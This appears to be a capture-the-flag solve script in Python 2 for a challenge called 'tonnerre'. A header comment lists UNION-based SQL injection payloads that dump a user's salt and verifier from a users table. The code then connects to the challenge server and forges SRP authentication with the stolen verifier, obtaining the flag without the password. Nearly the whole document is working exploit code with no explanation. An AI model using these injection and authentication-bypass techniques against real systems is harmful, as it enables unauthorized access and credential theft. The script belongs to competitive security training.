'''
' union select user from users limit 1 offset 0#
get_flag
' union select salt from users limit 1 offset 0#
d14058efb3f49bd1f1c68de447393855e004103d432fa61849f0e5262d0d9e8663c0dfcb877d40ea6de6b78efd064bdd02f6555a90d92a8a5c76b28b9a785fd861348af8a7014f4497a5de5d0d703a24ff9ec9b5c1ff8051e3825a0fc8a433296d31cf0bd5d21b09c8cd7e658f2272744b4d2fb63d4bccff8f921932a2e81813
' union select verifier from users limit 1 offset 0#
ebedd14b5bf7d5fd88eebb057af43803b6f88e42f7ce2a4445fdbbe69a9ad7e7a76b7df4a4e79cefd61ea0c4f426c0261acf5becb5f79cdf916d684667b6b0940b4ac2f885590648fbf2d107707acb38382a95bea9a89fb943a5c1ef6e6d064084f8225eb323f668e2c3174ab7b1dbfce831507b33e413b56a41528b1c850e59
'''
from Crypto.Random import random
from Crypto.Hash import SHA256
import socket
import gmpy

N = 168875487862812718103814022843977235420637243601057780595044400667893046269140421123766817420546087076238158376401194506102667350322281734359552897112157094231977097740554793824701009850244904160300597684567190792283984299743604213533036681794114720417437224509607536413793425411636411563321303444740798477587L
g = 9797766621314684873895700802803279209044463565243731922466831101232640732633100491228823617617764419367505179450247842283955649007454149170085442756585554871624752266571753841250508572690789992495054848L

def H(P):
  h = SHA256.new()
  h.update(P)
  return h.hexdigest()

def tostr(A):
  return hex(A)[2:].strip('L')
def fromstr(A):
  return int(A,16)

# SRP
# http://pythonhosted.org/srp/srp.html#usage
I=username = 'get_flag'
s=salt = fromstr('d14058efb3f49bd1f1c68de447393855e004103d432fa61849f0e5262d0d9e8663c0dfcb877d40ea6de6b78efd064bdd02f6555a90d92a8a5c76b28b9a785fd861348af8a7014f4497a5de5d0d703a24ff9ec9b5c1ff8051e3825a0fc8a433296d31cf0bd5d21b09c8cd7e658f2272744b4d2fb63d4bccff8f921932a2e81813')
v=verifier =  fromstr('ebedd14b5bf7d5fd88eebb057af43803b6f88e42f7ce2a4445fdbbe69a9ad7e7a76b7df4a4e79cefd61ea0c4f426c0261acf5becb5f79cdf916d684667b6b0940b4ac2f885590648fbf2d107707acb38382a95bea9a89fb943a5c1ef6e6d064084f8225eb323f668e2c3174ab7b1dbfce831507b33e413b56a41528b1c850e59')

#sock = socket.create_connection(('localhost',8561))
sock = socket.create_connection(('tonnerre.pwning.xxx',8561))

print sock.recv(4096)

sock.send(I+'\n')

a = random.randint(2, N-3)
A = pow(g,a,N)
v_inverse = gmpy.invert(v,N)
newA = (A * v_inverse) % N
sock.send(tostr(newA)+'\n')

assert fromstr(sock.recv(4096).strip('\n')) == s
B = fromstr(sock.recv(4096))
print 'B',B
print 

K = pow(B-v,a,N)
hashed_K = H(tostr(K))
print 'hashed_K',hashed_K
print 'K',K
print 

proof = H(tostr(B) + hashed_K)
sock.send(proof+'\n')

print sock.recv(4096)
flag = sock.recv(4096)
print flag
print
